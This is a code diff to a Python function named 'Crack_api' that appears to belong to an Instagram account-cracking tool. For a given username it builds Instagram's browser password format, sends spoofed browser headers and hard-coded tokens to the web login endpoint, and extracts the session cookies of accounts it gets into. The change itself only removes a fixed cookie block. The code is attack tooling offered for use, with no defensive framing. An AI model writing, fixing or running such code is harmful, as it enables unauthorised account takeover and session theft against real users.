@@ -789,16 +789,6 @@ def Crack_api(username, kontol):
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
             enc_password_encoded = urllib.parse.quote(enc_password)
-            cookies = {
-            'csrftoken': csrftoken,
-            'datr': '0_2JaizKKK8UnKjOd1Xq9I8W',
-            'ig_did': str(uuid.uuid4()).upper(),
-            'mid': 'aon90wABAAFs7rBDWxQbI2ayAiNy',
-            'ig_nrcb': '1',
-            'ps_l': '1',
-            'ps_n': '1',
-            'dpr': '3.0234789848327637',
-            'wd': '891x969'}
             headers = {
             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
             'sec-ch-ua-platform': '"Windows"',
@@ -820,7 +810,7 @@ def Crack_api(username, kontol):
             'X-IG-WWW-Claim': 'hmac.AR0lFPVrPWfUaasIaEe7P5wZzNvi4rTJt5zBnbJl9QfE-UHY',
             'sec-ch-ua-platform-version': '"10.0.0"',}
             data = f'enc_password={enc_password_encoded}&caaF2DebugGroup=-1&isPrivacyPortalReq=false&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%22oneTapUsers%22%3A%22%5B%5C%2271197200037%5C%22%5D%22%7D&trustedDeviceRecords=%7B%2271197200037%22%3A%7B%22machine_id%22%3A%22afAaSAALAAH1E9oBPA3kaW94g3fT%22%2C%22nonce%22%3A%223wQWQEa1bhApmLnMUuObWk0uwmWXdePxIg9cUI7IyfEAwTLJxEJWdB4IPKme32DX%22%7D%7D&username={username}&jazoest=22902&fb_dtsg=NAfyFFlfztZGS1a5mQLPSTxampkgFsMeFeO9BbRWiV5VgtEFJ71WCCg%3A17843709688147332%3A1787460646'
-            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = ses.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
